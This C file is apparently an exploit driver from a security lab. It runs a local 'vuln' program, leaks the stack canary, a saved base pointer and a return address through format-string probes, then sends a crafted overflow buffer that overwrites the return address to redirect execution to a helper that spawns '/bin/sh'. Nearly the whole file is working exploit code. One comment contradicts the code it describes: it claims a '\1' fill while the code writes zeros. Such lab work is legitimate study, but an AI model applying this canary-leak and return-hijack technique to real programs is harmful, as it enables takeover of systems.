#include <stdio.h>
#include <stdarg.h>
#include <unistd.h>
#include <assert.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>
#include <stdint.h>
#include <errno.h>

/******************************************************************************
   Unless you are interested in the details of how this program communicates
   with a subprocess, you can skip all of the code below and skip directly to
   the main function below. 
*******************************************************************************/

#define err_abort(x) do { \
      if (!(x)) {\
         fprintf(stderr, "Fatal error: %s:%d: ", __FILE__, __LINE__);   \
         perror(""); \
         exit(1);\
      }\
   } while (0)

char buf[1<<20];
unsigned end;
int from_child, to_child;

void print_escaped(FILE *fp, const char* buf, unsigned len) {
   int i;
   for (i=0; i < len; i++) {
      if (isprint(buf[i]))
         fputc(buf[i], stderr);
      else fprintf(stderr, "\\x%02hhx", buf[i]);
   }
}

void put_bin_at(char b[], unsigned len, unsigned pos) {
   assert(pos <= end);
   if (pos+len > end)
      end = pos+len;
   assert(end < sizeof(buf));
   memcpy(&buf[pos], b, len);
}

void put_bin(char b[], unsigned len) {
   put_bin_at(b, len, end);
}

void put_formatted(const char* fmt, ...) {
   va_list argp;
   char tbuf[10000];
   va_start (argp, fmt);
   vsnprintf(tbuf, sizeof(tbuf), fmt, argp);
   put_bin(tbuf, strlen(tbuf));
}

void put_str(const char* s) {
   put_formatted("%s", s);
}

static
void send() {
   err_abort(write(to_child, buf, end) == end);
   fprintf(stderr, "driver: Sent:'");
   print_escaped(stderr, buf, end);
   fprintf(stderr, "'\n");
   end = 0;
}

char outbuf[1<<20];
int get_formatted(const char* fmt, ...) {
   va_list argp;
   va_start(argp, fmt);
   int nread=0;
   err_abort((nread = read(from_child, outbuf, sizeof(outbuf)-1)) >=0);
   outbuf[nread] = '\0';
   fprintf(stderr, "driver: Received '%s'\n", outbuf);
   return vsscanf(outbuf, fmt, argp);
}

int pid;
void create_subproc(const char* exec, char* argv[]) {
   int pipefd_out[2];
   int pipefd_in[2];
   err_abort(pipe(pipefd_in) >= 0);
   err_abort(pipe(pipefd_out) >= 0);
   if ((pid = fork()) == 0) { // Child process
      err_abort(dup2(pipefd_in[0], 0) >= 0);
      close(pipefd_in[1]);
      close(pipefd_out[0]);
      err_abort(dup2(pipefd_out[1], 1) >= 0);
      err_abort(execve(exec, argv, NULL) >= 0);
   }
   else { // Parent
      close(pipefd_in[0]);
      to_child = pipefd_in[1];
      from_child = pipefd_out[0];
      close(pipefd_out[1]);
   }
}

/* Shows an example session with subprocess. Change it as you see fit, */

#define STRINGIFY2(X) #X
#define STRINGIFY(X) STRINGIFY2(X)

int main(int argc, char* argv[]) {
   char *nargv[3];
   nargv[0] = "vuln";
   nargv[1] = STRINGIFY(GRP);
   nargv[2] = NULL;

   
   uint64_t main_bp			=	0x7ffdfc8dd4d0;
   uint64_t g_bp			=	0x7ffdfc8dce20;
   uint64_t auth_bp			=	0x7ffdfc8dcdd0;
   uint64_t auth_cred_loc		=	0x7ffdfc8dcdc0; 
   uint64_t auth_db_loc		=	0x7ffdfc8dcdb8;
   uint64_t auth_cred			=	0x7ffdfc8dccd0;
   
   uint64_t phelper_addr		=	0x5606d303ef51;
   uint64_t main_return_addr		= 	0x5606d303eea9;
   
   
   // Compute the required offsets offsets
   uint64_t auth_main_bp_dist		= main_bp - auth_bp;
   uint64_t auth_bp_cred_dist		= auth_bp - auth_cred;
   uint64_t g_main_bp_dist		= main_bp - g_bp;
   uint64_t g_bp_cred_dist		= g_bp - auth_cred;
   uint64_t phelper_main_bp_dist	= main_return_addr - phelper_addr;

   
   create_subproc("./vuln", nargv);
   fprintf(stderr, "driver: created vuln subprocess. If you want to use gdb on vuln, go ahead and do that now. Press 'enter' when you are ready to continue with the exploit\n");
   getchar();
   get_formatted("%*s"); //Needed to clear out the Welcome message


   // Loop to do the probing by exploiting format string vulnerability
	
/*
   char s[64];
   for (int j= 1; j < 400; j++) {
      sprintf(s, "e %%%d$p\n", j);
      put_str(s);
      send();
      uint64_t extr;
      get_formatted("%p", &extr);
      fprintf(stderr, "Extr %lx\n", extr);
   }
*/


   // Probe for main bp
   put_str("e %154$p\n");
   send();
   uint64_t cur_main_bp;
   get_formatted("%p", &cur_main_bp);
   fprintf(stderr, "driver: Extracted cur_main_bp=%lx\n", cur_main_bp);
   
   
   // Probe for canary value
   put_str("e %15$p\n");
   send();
   uint64_t canary;
   get_formatted("%p", &canary);
   fprintf(stderr, "driver: Extracted canary=%lx\n", canary);
   
   // Probe for main's return instruction address
   put_str("e %219$p\n");
   send();
   uint64_t cur_main_return_addr;
   get_formatted("%p", &cur_main_return_addr);
   fprintf(stderr, "driver: Extracted main instruction return address=%lx\n", cur_main_return_addr);
   
   
   // Now, compute the base pointer for the current run using the probed values
   uint64_t cur_g_bp		= cur_main_bp - g_main_bp_dist;
   uint64_t cur_auth_bp	= cur_main_bp - auth_main_bp_dist;
   uint64_t cur_phelper_addr	= cur_main_return_addr - phelper_main_bp_dist;
   uint64_t cur_cred		= cur_auth_bp - auth_bp_cred_dist;
   fprintf(stderr, "driver: Computed cur_g_bp=%lx\n", cur_g_bp);
   fprintf(stderr, "driver: Computed cur_auth_bp=%lx\n", cur_auth_bp);
   fprintf(stderr, "driver: Computed phelper_addr=%lx\n", cur_phelper_addr);
   fprintf(stderr, "driver: Computed cur_cred=%lx\n", cur_cred);


   // Send the payload
   put_str("p 1234567\n");
   send();
   get_formatted("%*s");


   // Allocate and prepare a buffer that contains the exploit string.
   unsigned explsz = g_bp_cred_dist - 8;  // -1 for "_" added by auth fn
   printf("Exploit size is: %d\n", explsz);
   void **expl = (void **)malloc(explsz);

   // Initialize the buffer with '\1' to make the contents predictable.
   // We use 1 rather than 0 because we are overwriting the location on
   // the stack where the parameters of auth are stored. If either plen
   // or ulen becomes zero then password checking won't even be attempted,
   // so our exploit will fail. 
   
   memset((void*)expl, '\0', explsz);

   // Now initialize the parts of the exploit buffer that really matter
   strcpy((char *)expl, "/bin/sh");
   expl[auth_bp_cred_dist/sizeof(void *)]	= cur_phelper_addr;
   expl[auth_bp_cred_dist/sizeof(void *) - 1]	= cur_g_bp;
   expl[auth_bp_cred_dist/sizeof(void *) - 2]	= canary;
    
    
   expl[g_bp_cred_dist/sizeof(void *) - 2] = 0x1234567000000000;
   expl[g_bp_cred_dist/sizeof(void *) - 3] = 0x123456789abcdef0;
   expl[g_bp_cred_dist/sizeof(void *) - 4] = cur_cred + sizeof(char *);
   
   put_str("u ");
   put_bin((char*)expl, explsz);
   put_str("\n");
   send();
   get_formatted("%*s");
   
   put_str("l \n");
   send();
   
   usleep(100000);
   get_formatted("%*s");

   kill(pid, SIGINT);

   int status;
   wait(&status);

   if (WIFEXITED(status)) {
      fprintf(stderr, "vuln exited, status=%d\n", WEXITSTATUS(status));
   } 
   else if (WIFSIGNALED(status)) {
      printf("vuln killed by signal %d\n", WTERMSIG(status));
   } 
   else if (WIFSTOPPED(status)) {
      printf("vuln stopped by signal %d\n", WSTOPSIG(status));
   } 
   else if (WIFCONTINUED(status)) {
      printf("vuln continued\n");
   }

}
